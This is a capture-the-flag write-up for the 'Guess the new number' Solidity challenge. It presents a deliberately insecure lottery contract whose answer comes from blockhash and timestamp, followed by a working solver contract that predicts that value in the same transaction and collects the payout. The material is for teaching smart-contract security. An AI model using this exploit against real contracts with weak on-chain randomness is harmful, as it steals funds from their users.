# Guess the new number
<sup>LOTTERIES: 400 POINTS</sup>

The number is now generated on-demand when a guess is made.

```solidity
pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

Enjoy this inspirational music while you work: [I Guess It’s Christmas Time](https://youtu.be/Qu3aqM1BnLc).



Solution:

```solidity
pragma solidity ^0.8.0;
interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberSolver {

    IGuessTheNewNumberChallenge public challenge;
    address public owner;

    constructor(address _challengeAddress) {
        challenge = IGuessTheNewNumberChallenge(_challengeAddress);
        owner = msg.sender;
    }

    function solve() public payable {
        require(msg.sender == owner, "Only the owner can solve this challenge");
        require(msg.value == 1 ether, "You must send an ether, first");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value: 1 ether}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```